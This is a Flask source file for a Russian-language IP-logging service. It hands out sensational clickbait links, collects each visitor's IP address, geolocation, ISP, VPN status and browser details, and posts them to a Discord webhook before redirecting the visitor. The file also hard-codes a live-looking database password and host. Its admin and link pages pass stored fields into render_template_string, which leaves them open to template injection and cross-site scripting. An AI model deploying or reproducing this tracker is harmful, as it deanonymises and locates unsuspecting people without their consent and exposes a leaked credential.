import logging
import base64
import httpagentparser
import requests
import random
import psycopg2
from flask import Flask, request, render_template_string, jsonify, g, session, redirect, url_for
from dotenv import load_dotenv
from functools import wraps
import os
from werkzeug.middleware.proxy_fix import ProxyFix

# Load environment variables from .env file
load_dotenv()

# Use environment variables
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
REAL_URL = os.getenv("REAL_URL")
REDIRECT_DELAY = int(os.getenv("REDIRECT_DELAY"))
LOGGING_LEVEL = os.getenv("LOGGING_LEVEL")
VPN_CHECK = int(os.getenv("VPN_CHECK"))
ANTI_BOT = int(os.getenv("ANTI_BOT"))

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY")

app.wsgi_app = ProxyFix(app.wsgi_app, x_for=2, x_proto=1, x_host=1)

# Configure logging
logging.basicConfig(level=LOGGING_LEVEL)

# Load fixed configurations
CLICKBAIT_TITLE = "😱 ШОК! Ты не поверишь, этот факт скрывался долгие годы..."
CLICKBAIT_DESCRIPTION = "🔥 Эксклюзив! Это должно было остаться в секрете, но утекло в сеть. Скорее смотри, пока не удалили!"
CLICKBAIT_IMAGE = "https://avatars.mds.yandex.net/i?id=a4aecf9cbc80023011c1e098ff28befc5fa6d0b6-8220915-images-thumbs&n=13"

# Configuration for image logging
config = {
    "webhook": DISCORD_WEBHOOK_URL,
    "image": CLICKBAIT_IMAGE,
    "imageArgument": True,
    "username": "ZeWardo",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Привет, мир!",
        "richMessage": True,
    },
    "vpnCheck": VPN_CHECK,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": ANTI_BOT,
    "redirect": {
        "redirect": True,
        "page": REAL_URL
    },
}

# List of jokes
jokes = [
    "Почему программисты плохо спят? Потому что они просыпаются от багов!",
    "Как называется программист без руки? Левосторонний.",
    "Почему программисты не любят природу? Потому что там слишком много багов!",
    "Как называется программист, который разбирается в алкоголе? Алкоголист.",
    "Почему программисты не ходят в бары? Потому что там слишком много багов!",
    "Как называется программист, который разбирается в музыке? Музыкант.",
    "Почему программисты не любят кофе? Потому что он вызывает слишком много багов!",
    "Как называется программист, который разбирается в искусстве? Художник.",
    "Почему программисты не ходят в кино? Потому что там слишком много багов!",
    "Как называется программист, который разбирается в спорте? Спортсмен."
]

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "ZeWorld - Ошибка",
                "color": config["color"],
                "description": f"Произошла ошибка при попытке залогировать IP!\n\n**Ошибка:**\n\n{error}\n",
            }
        ],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    bot = botCheck(ip, useragent)

    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Zewardo - ссылка отправлена",
                    "color": config["color"],
                    "description": f"Ссылка **Zewardo** была отправлена в чат!\nСкоро вы можете получить IP.\n\n**Конечная точка:** `{endpoint}`\n**IP:** `{ip}`\n**Платформа:** `{bot}`",
                }
            ],
        }) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()

        # Check for 'proxy' key in response
        if 'proxy' in info and info["proxy"]:
            if config["vpnCheck"] == 2:
                return
            if config["vpnCheck"] == 1:
                ping = ""

        if 'hosting' in info and info["hosting"]:
            if config["antiBot"] == 4:
                if info.get("proxy"):
                    pass
                else:
                    return
            if config["antiBot"] == 3:
                return
            if config["antiBot"] == 2:
                if info.get("proxy"):
                    pass
                else:
                    ping = ""
            if config["antiBot"] == 1:
                ping = ""

        os, browser = httpagentparser.simple_detect(useragent)

        # Safe access to timezone information
        timezone_parts = info.get('timezone', 'Unknown/Unknown').split('/')
        timezone_name = timezone_parts[1].replace('_', ' ') if len(timezone_parts) > 1 else 'Unknown'
        timezone_region = timezone_parts[0] if len(timezone_parts) > 1 else 'Unknown'

        embed = {
            "username": config["username"],
            "content": ping,
            "embeds": [
                {
                    "title": "Zewardo - IP залогирован",
                    "color": config["color"],
                    "description": f"""**Пользователь открыл оригинальное изображение!**

**Конечная точка:** `{endpoint}`

**Информация об IP:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Провайдер:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Страна:** `{info.get('country', 'Unknown')}`
> **Регион:** `{info.get('regionName', 'Unknown')}`
> **Город:** `{info.get('city', 'Unknown')}`
> **Координаты:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Приблизительные' if not coords else 'Точные, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Часовой пояс:** `{timezone_name}` ({timezone_region})
> **Мобильный:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Бот:** `{info.get('hosting', 'False') if info.get('hosting') and not info.get('proxy') else 'Возможно' if info.get('hosting') else 'False'}`

**Информация о ПК:**
> **ОС:** `{os}`
> **Браузер:** `{browser}`

**User Agent:**
```
{useragent}
```""",
                }
            ],
        }

        if url:
            embed["embeds"][0].update({"thumbnail": {"url": url}})
        requests.post(config["webhook"], json=embed)
        return info

    except Exception as e:
        logging.error(f"Ошибка при обработке информации об IP: {e}")
        return

def get_db():
    if 'db' not in g:
        g.db = psycopg2.connect(
            dbname="railway",
            user="postgres",
            password="ARqhUZuObMCvMaLssOOOVpbkQmkFqjwk",
            host="junction.proxy.rlwy.net",
            port="32594"
        )
    return g.db

@app.teardown_appcontext
def close_db(e=None):
    db = g.pop('db', None)
    if db is not None:
        db.close()

def init_db():
    try:
        with app.app_context():
            db = get_db()
            cursor = db.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS links (
                    id SERIAL PRIMARY KEY,
                    path TEXT UNIQUE NOT NULL,
                    title TEXT NOT NULL,
                    description TEXT NOT NULL,
                    image_url TEXT NOT NULL,
                    redirect_url TEXT NOT NULL,
                    redirect_delay INTEGER DEFAULT 5,
                    click_count INTEGER DEFAULT 0
                )
            ''')
            db.commit()  # Commit the table creation

            # Check if the table exists and has rows
            cursor.execute('SELECT COUNT(*) FROM links')
            existing = cursor.fetchone()
            if existing is not None and existing[0] == 0:
                cursor.execute('''
                    INSERT INTO links (path, title, description, image_url, redirect_url, redirect_delay)
                    VALUES (%s, %s, %s, %s, %s, %s)
                ''', (
                    'XzAc24',
                    CLICKBAIT_TITLE,
                    CLICKBAIT_DESCRIPTION,
                    CLICKBAIT_IMAGE,
                    REAL_URL,
                    REDIRECT_DELAY
                ))
                db.commit()  # Commit the insertion

    except Exception as e:
        logging.error(f"Database initialization error: {e}")

# Initialize DB on startup
init_db()

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

# ====================== Admin Login ======================
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if (request.form['username'] == os.getenv("ADMIN_USERNAME") and
            request.form['password'] == os.getenv("ADMIN_PASSWORD")):
            session['logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        return "Неверные данные", 401
    return render_template_string('''
        <style>
            .admin-container {
                max-width: 400px;
                margin: 50px auto;
                padding: 30px;
                background: #1a1a1a;
                border-radius: 10px;
                box-shadow: 0 0 20px rgba(0,0,0,0.3);
            }
            .admin-title {
                color: #00ffff;
                text-align: center;
                margin-bottom: 30px;
                font-size: 24px;
                text-transform: uppercase;
            }
            .admin-form input {
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                background: #333;
                border: 1px solid #444;
                color: white;
                border-radius: 5px;
                transition: all 0.3s;
            }
            .admin-form input:focus {
                outline: none;
                border-color: #00ffff;
                box-shadow: 0 0 8px rgba(0,255,255,0.2);
            }
            .admin-form button {
                width: 100%;
                padding: 12px;
                background: #009688;
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                margin-top: 20px;
                transition: all 0.3s;
            }
            .admin-form button:hover {
                background: #00796b;
            }
        </style>
        <div class="admin-container">
            <div class="admin-title">Admin Login</div>
            <form class="admin-form" method="post">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    ''')

@app.route('/admin/logout')
def admin_logout():
    session.pop('logged_in', None)
    return redirect(url_for('admin_login'))

# ====================== Admin Dashboard ======================
@app.route('/admin')
@login_required
def admin_dashboard():
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM links')
    links = cursor.fetchall()
    links_html = "<table><tr><th>Path</th><th>Title</th><th>Clicks</th><th>Actions</th></tr>"
    for link in links:
        links_html += f"""
        <tr>
            <td>{link[1]}</td>
            <td>{link[2]}</td>
            <td>{link[7]}</td>
            <td>
                <a href="/admin/links/{link[0]}/edit">Edit</a>
                <form method="POST" action="/admin/links/{link[0]}/delete">
                    <button type="submit">Delete</button>
                </form>
            </td>
        </tr>
        """
    links_html += "</table>"
    return render_template_string(f'''
        <style>
            .admin-header {{
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 20px;
                background: #1a1a1a;
                margin-bottom: 30px;
            }}
            .admin-nav a {{
                color: #00ffff;
                text-decoration: none;
                margin-left: 20px;
                padding: 8px 15px;
                border-radius: 5px;
                transition: all 0.3s;
            }}
            .admin-nav a:hover {{
                background: rgba(0,255,255,0.1);
            }}
            .links-table {{
                width: 100%;
                border-collapse: collapse;
                background: #1a1a1a;
                border-radius: 8px;
                overflow: hidden;
            }}
            .links-table th, .links-table td {{
                padding: 15px;
                text-align: left;
                border-bottom: 1px solid #333;
            }}
            .links-table th {{
                background: #009688;
                color: white;
            }}
            .links-table tr:hover {{
                background: rgba(255,255,255,0.02);
            }}
            .action-buttons a {{
                color: #00ffff;
                margin-right: 10px;
                text-decoration: none;
            }}
            .action-buttons button {{
                background: #ff4444;
                color: white;
                border: none;
                padding: 5px 10px;
                border-radius: 3px;
                cursor: pointer;
                transition: all 0.3s;
            }}
            .action-buttons button:hover {{
                background: #cc0000;
            }}
            .add-link-btn {{
                display: inline-block;
                padding: 10px 20px;
                background: #009688;
                color: white;
                text-decoration: none;
                border-radius: 5px;
                margin: 20px 0;
            }}
        </style>

        <div class="admin-header">
            <h1>Admin Dashboard</h1>
            <nav class="admin-nav">
                <a href="/admin/logout">Logout</a>
            </nav>
        </div>

        <div class="admin-content">
            <a href="/admin/links/new" class="add-link-btn">+ Add New Link</a>
            <table class="links-table">
                {links_html}
            </table>
        </div>
    ''')

def get_form_style():
    return '''
        <style>
            .form-container {{
                max-width: 600px;
                margin: 30px auto;
                padding: 30px;
                background: #1a1a1a;
                border-radius: 10px;
            }}
            .form-group {{
                margin-bottom: 20px;
            }}
            .form-group label {{
                display: block;
                margin-bottom: 8px;
                color: #00ffff;
            }}
            .form-group input {{
                width: 100%;
                padding: 12px;
                background: #333;
                border: 1px solid #444;
                color: white;
                border-radius: 5px;
                transition: all 0.3s;
            }}
            .form-group input:focus {{
                outline: none;
                border-color: #00ffff;
                box-shadow: 0 0 8px rgba(0,255,255,0.2);
            }}
            .form-submit {{
                background: #009688;
                color: white;
                padding: 12px 25px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                transition: all 0.3s;
            }}
            .form-submit:hover {{
                background: #00796b;
            }}
        </style>
    '''

# Модифицируем формы создания/редактирования
@app.route('/admin/links/new', methods=['GET', 'POST'])
@login_required
def new_link():
    if request.method == 'POST':
        db = get_db()
        cursor = db.cursor()
        cursor.execute('''
            INSERT INTO links (path, title, description, image_url, redirect_url, redirect_delay)
            VALUES (%s, %s, %s, %s, %s, %s)
        ''', (
            request.form['path'],
            request.form['title'],
            request.form['description'],
            request.form['image_url'],
            request.form['redirect_url'],
            request.form['redirect_delay']
        ))
        db.commit()
        return redirect(url_for('admin_dashboard'))
    return render_template_string(get_form_style() + '''
        <div class="form-container">
            <h2>Create New Link</h2>
            <form method="post">
                <div class="form-group">
                    <label>Path:</label>
                    <input type="text" name="path" required>
                </div>
                <div class="form-group">
                    <label>Title:</label>
                    <input type="text" name="title" required>
                </div>
                <div class="form-group">
                    <label>Description:</label>
                    <input type="text" name="description" required>
                </div>
                <div class="form-group">
                    <label>Image URL:</label>
                    <input type="text" name="image_url" required>
                </div>
                <div class="form-group">
                    <label>Redirect URL:</label>
                    <input type="text" name="redirect_url" required>
                </div>
                <div class="form-group">
                    <label>Redirect Delay:</label>
                    <input type="number" name="redirect_delay" required>
                </div>
                <button type="submit" class="form-submit">Create</button>
            </form>
        </div>
    ''')

@app.route('/admin/links/<int:id>/edit', methods=['GET', 'POST'])
@login_required
def edit_link(id):
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM links WHERE id = %s', (id,))
    link = cursor.fetchone()
    if request.method == 'POST':
        cursor.execute('''
            UPDATE links SET path = %s, title = %s, description = %s, image_url = %s, redirect_url = %s, redirect_delay = %s
            WHERE id = %s
        ''', (
            request.form['path'],
            request.form['title'],
            request.form['description'],
            request.form['image_url'],
            request.form['redirect_url'],
            request.form['redirect_delay'],
            id
        ))
        db.commit()
        return redirect(url_for('admin_dashboard'))
    return render_template_string(get_form_style() + f'''
        <div class="form-container">
            <h2>Edit Link</h2>
            <form method="post">
                <div class="form-group">
                    <label>Path:</label>
                    <input type="text" name="path" value="{link[1]}" required>
                </div>
                <div class="form-group">
                    <label>Title:</label>
                    <input type="text" name="title" value="{link[2]}" required>
                </div>
                <div class="form-group">
                    <label>Description:</label>
                    <input type="text" name="description" value="{link[3]}" required>
                </div>
                <div class="form-group">
                    <label>Image URL:</label>
                    <input type="text" name="image_url" value="{link[4]}" required>
                </div>
                <div class="form-group">
                    <label>Redirect URL:</label>
                    <input type="text" name="redirect_url" value="{link[5]}" required>
                </div>
                <div class="form-group">
                    <label>Redirect Delay:</label>
                    <input type="number" name="redirect_delay" value="{link[6]}" required>
                </div>
                <button type="submit" class="form-submit">Update</button>
            </form>
        </div>
    ''')

@app.route('/admin/links/<int:id>/delete', methods=['POST'])
@login_required
def delete_link(id):
    db = get_db()
    cursor = db.cursor()
    cursor.execute('DELETE FROM links WHERE id = %s', (id,))
    db.commit()
    return redirect(url_for('admin_dashboard'))

@app.route('/')
def home():
    joke = random.choice(jokes)
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta property="og:title" content="Анекдот дня">
        <meta property="og:description" content="{joke}">
        <meta property="og:type" content="website">
        <meta property="og:url" content="https://ваш-сайт.ru/anekdot">
        <meta property="og:image" content="https://ваш-сайт.ru/images/og-preview.jpg">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content="Анекдот дня">
        <meta name="twitter:description" content="{joke}">
        <meta name="twitter:image" content="https://ваш-сайт.ru/images/og-preview.jpg">
        <title>Анекдот</title>
        <style>
            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                text-align: center;
                background: linear-gradient(45deg, #ff416c, #ff4b2b);
                color: white;
                height: 100vh;
                margin: 0;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                animation: fadeIn 2s ease;
            }}
            h1 {{
                font-size: 3em;
                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
                margin-bottom: 20px;
            }}
            p {{
                font-size: 1.5em;
                margin: 10px 0;
            }}
            @keyframes fadeIn {{
                from {{ opacity: 0; }}
                to {{ opacity: 1; }}
            }}
        </style>
    </head>
    <body>
        <h1>Анекдот дня</h1>
        <p>{joke}</p>
    </body>
    </html>
    """
    return render_template_string(html_content)

@app.route('/<custom_path>')
def handle_custom_link(custom_path):
    try:
        db = get_db()
        cursor = db.cursor()
        cursor.execute('SELECT * FROM links WHERE path = %s', (custom_path,))
        link = cursor.fetchone()
        if link is None:
            return "Ссылка не найдена", 404

        cursor.execute('UPDATE links SET click_count = click_count + 1 WHERE id = %s', (link[0],))
        db.commit()

        user_ip = (
            request.headers.get('CF-Connecting-IP',  # Priority for Cloudflare
            request.headers.get('X-Forwarded-For', request.remote_addr))
        ).split(',')[0].strip()  # Safe extraction of the first IP

        user_agent = request.headers.get('User-Agent')
        makeReport(user_ip, user_agent, endpoint=request.path)

        html_content = f"""
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <title>{link[2]}</title>
            <!-- Open Graph Meta Tags -->
            <meta property="og:title" content="{link[2]}">
            <meta property="og:description" content="{link[3]}">
            <meta property="og:image" content="{link[4]}">
            <meta property="og:url" content="{request.url}">
            <meta property="og:type" content="website">
            <!-- Twitter Cards -->
            <meta name="twitter:card" content="summary_large_image">
            <meta name="twitter:title" content="{link[2]}">
            <meta name="twitter:description" content="{link[3]}">
            <meta name="twitter:image" content="{link[4]}">
            <style>
                body {{
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    text-align: center;
                    background: linear-gradient(45deg, #ff416c, #ff4b2b);
                    color: white;
                    height: 100vh;
                    margin: 0;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    animation: fadeIn 2s ease;
                }}
                h1 {{
                    font-size: 3em;
                    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
                    margin-bottom: 20px;
                }}
                p {{
                    font-size: 1.5em;
                    margin: 10px 0;
                }}
                .spinner {{
                    border: 6px solid rgba(255, 255, 255, 0.3);
                    border-top: 6px solid white;
                    border-radius: 50%;
                    width: 50px;
                    height: 50px;
                    animation: spin 1s linear infinite;
                    margin: 20px auto;
                }}
                @keyframes fadeIn {{
                    from {{ opacity: 0; }}
                    to {{ opacity: 1; }}
                }}
                @keyframes spin {{
                    0% {{ transform: rotate(0deg); }}
                    100% {{ transform: rotate(360deg); }}
                }}
                .button {{
                    background: white;
                    color: #ff416c;
                    border: none;
                    padding: 15px 30px;
                    font-size: 1.2em;
                    border-radius: 10px;
                    cursor: pointer;
                    margin-top: 20px;
                    transition: background 0.3s, color 0.3s;
                }}
                .button:hover {{
                    background: #ff4b2b;
                    color: white;
                }}
            </style>
            <script>
                setTimeout(function() {{
                    window.location.href = "{link[5]}";
                }}, {link[6] * 1000});
            </script>
        </head>
        <body>
            <h1>{link[2]}</h1>
            <p>Ты в шоке? 😱 Через {link[6]} секунд ты узнаешь правду!</p>
            <div class="spinner"></div>
            <button class="button" onclick="window.location.href='{link[5]}'">Узнать правду</button>
        </body>
        </html>
        """
        return render_template_string(html_content)
    except Exception as e:
        logging.error(f"Ошибка: {e}")
        return "Ошибка", 500

if __name__ == '__main__':
    host = "0.0.0.0"
    port = 5000
    app.run(host=host, port=port, debug=False)